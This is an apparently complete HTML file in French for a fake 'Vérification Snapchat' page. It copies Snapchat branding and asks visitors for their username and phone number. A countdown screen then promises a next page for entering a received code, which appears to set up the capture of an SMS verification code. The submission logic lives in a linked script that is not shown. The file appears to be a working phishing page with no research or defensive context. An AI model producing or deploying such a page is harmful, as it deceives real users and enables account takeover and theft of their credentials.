<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification Snapchat</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <!-- Logo Snapchat -->
        <div class="logo-section">
            <svg class="snapchat-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2c5.523 0 10 4.477 10 10 0 5.523-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2zm0 1.5c-4.695 0-8.5 3.805-8.5 8.5s3.805 8.5 8.5 8.5 8.5-3.805 8.5-8.5-3.805-8.5-8.5-8.5z" fill="none" stroke="currentColor" stroke-width="1.5"/>
                <circle cx="9" cy="11" r="1.5" fill="currentColor"/>
                <circle cx="15" cy="11" r="1.5" fill="currentColor"/>
                <path d="M12 15c1-1 2.5-1.5 3-1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" fill="none"/>
            </svg>
        </div>

        <!-- Titre principal -->
        <h1>Bienvenue!</h1>
        <p class="subtitle">Complétez la vérification pour continuer</p>

        <!-- Étape 1: Username et Numéro -->
        <form id="step1Form" class="form">
            <!-- Champ Username -->
            <div class="form-group">
                <label for="username">
                    <span class="icon username-icon">👤</span>
                    Username
                </label>
                <input 
                    type="text" 
                    id="username" 
                    name="username" 
                    placeholder="Entrez votre username" 
                    required
                >
            </div>

            <!-- Champ Numéro de téléphone -->
            <div class="form-group">
                <label for="phone">
                    <span class="icon phone-icon">📱</span>
                    Numéro de téléphone
                </label>
                <input 
                    type="tel" 
                    id="phone" 
                    name="phone" 
                    placeholder="06 XX XX XX XX" 
                    required
                >
            </div>

            <!-- Bouton Envoyer -->
            <button type="submit" class="btn-continue">Envoyer</button>
        </form>

        <!-- Écran d'attente après envoi -->
        <div id="waitingScreen" class="waiting-screen hidden">
            <p class="waiting-title">Envoi effectué !</p>
            <p>Votre demande a bien été envoyée.</p>
            <p>Veuillez patienter <strong><span id="countdown">02:00</span></strong> avant de passer à la page de code reçu.</p>
        </div>

        <!-- Message de statut -->
        <div id="statusMessage" class="status-message"></div>
    </div>

    <script src="script2.js?v=3"></script>
</body>
</html>
